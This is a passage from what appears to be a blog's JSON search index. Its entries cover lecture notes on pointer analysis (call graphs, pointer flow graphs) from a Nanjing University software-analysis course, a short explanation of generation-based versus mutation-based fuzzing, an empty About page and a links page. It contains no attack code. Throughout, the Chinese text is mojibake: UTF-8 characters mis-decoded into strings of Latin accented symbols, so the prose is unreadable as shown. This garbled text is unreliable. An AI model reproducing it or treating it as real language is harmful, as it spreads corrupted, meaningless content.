çš„è¾¹åœ¨è°ƒç”¨å›¾ä¸­æ²¡æœ‰ï¼Œå°±åœ¨è°ƒç”¨å›¾ä¸­æ·»åŠ ä¸€æ¡ä» L æŒ‡å‘ m çš„è¾¹ï¼Œå¹¶ä¸”è®¾ç½® m ä¸ºå¯è¾¾ å¯¹äº m ä¸­çš„æ¯ä¸ªå‚æ•°ï¼Œéƒ½åœ¨ PFG ä¸­æ·»åŠ ä¸€æ¡å®å‚æŒ‡å‘å½¢å‚çš„è¾¹ æ·»åŠ ä¸€æ¡ m è¿”å›å€¼æŒ‡å‘è°ƒç”¨å¤„è¿”å›å€¼çš„è¾¹ ","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E8%8A%82pointer-analysis-foundations-ii/","summary":"è§†é¢‘ï¼šå—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹10ï¼ˆPointer Analysis - Foundations IIï¼‰å“”å“©å“”å“©_bilibili PPTï¼š https://cs.nju.edu.cn/tiantan/software-analysis/PTA-FD.pdf ç¬”è®°å‚è€ƒï¼š(34æ¡æ¶ˆæ¯) ã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯","title":"å—å¤§è½¯ä»¶åˆ†æç¬¬åèŠ‚â€”â€”Pointer Analysis - Foundations II"},{"content":"åŸºäºç”Ÿæˆå’ŒåŸºäºå˜å¼‚çš„æ¨¡ç³Š ä»æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆçš„è§’åº¦æ¥çœ‹ï¼Œæ¨¡ç³Šæµ‹è¯•æŠ€æœ¯å¯åˆ†ä¸ºåŸºäºç”Ÿæˆçš„æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯å’ŒåŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ã€‚ å…¶ä¸­ï¼ŒåŸºäºç”Ÿæˆçš„æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯æ ¹æ®è¯­æ³•æˆ–æœ‰æ•ˆè¯­æ–™åº“ä»å¤´å¼€å§‹ç”Ÿæˆè¾“å…¥ï¼Œå°±å¥½åƒä»åŸºå› åˆ°äººä½“çš„ä¸€ä¸ªæˆé•¿è¿‡ç¨‹ã€‚è¯¥æŠ€æœ¯ä¸è¿›è¡Œæ¯”ç‰¹ä½è°ƒåº¦æˆ–å˜å¼‚ç®—æ³•è°ƒåº¦ï¼Œè€Œæ˜¯ä¾§é‡äºä»åˆå§‹è§„åˆ™æ„é€ ã€‚ åŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯å¯¹ç°æœ‰çš„æœ‰æ•ˆæœçš„å¼‚å¸¸æµ‹è¯•ç”¨ä¾‹ï¼ˆç§°ä¸ºç§å­ï¼‰è¿›è¡Œå˜å¼‚ï¼Œä»¥è·å¾—æ–°çš„æµ‹è¯•ç”¨ä¾‹ã€‚ä¾‹å¦‚ï¼Œç‰ç±³çš„åŸºå› å˜å¼‚ä¼šäº§ç”Ÿä¸åŒå½¢æ€ä¸€æ ·ã€‚è¯¥æŠ€æœ¯éœ€è¦ç»™å®šä¸€ä¸ªç§å­é›†ï¼Œæ‰§è¡Œç§å­è°ƒåº¦ã€æ¯”ç‰¹ä½è°ƒåº¦å’Œå˜å¼‚ç®—æ³•è°ƒåº¦ä»¥è·å¾—æ–°çš„æµ‹è¯•ç”¨ä¾‹ã€‚\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9/","summary":"åŸºäºç”Ÿæˆå’ŒåŸºäºå˜å¼‚çš„æ¨¡ç³Š ä»æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆçš„è§’åº¦æ¥çœ‹ï¼Œæ¨¡ç³Šæµ‹è¯•æŠ€æœ¯å¯åˆ†ä¸ºåŸºäºç”Ÿæˆçš„æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯å’ŒåŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ã€‚ å…¶ä¸­ï¼ŒåŸºäºç”Ÿæˆçš„æ¨¡ç³Šæµ‹è¯•","title":""},{"content":"å¾…å†™ã€‚ã€‚ã€‚ã€‚\n","permalink":"https://juhuax.github.io/about/","summary":"å¾…å†™ã€‚ã€‚ã€‚ã€‚","title":"About"},{"content":"\rJUHUA\u0026#39;s Blog\rå’Œä½ åˆ†äº«æˆ‘åœ¨å¹²å˜›\ræ ¼å¼è¦æ±‚ åç§°ï¼š\nç½‘å€ï¼š\nå›¾æ ‡ï¼š\næè¿°ï¼š\n","permalink":"https://juhuax.github.io/links/","summary":"JUHUA\u0026#39;s Blog å’Œä½ åˆ†äº«æˆ‘åœ¨å¹²å˜› æ ¼å¼è¦æ±‚ åç§°ï¼š ç½‘å€ï¼š å›¾æ ‡ï¼š æè¿°ï¼š","title":"å‹é“¾"}]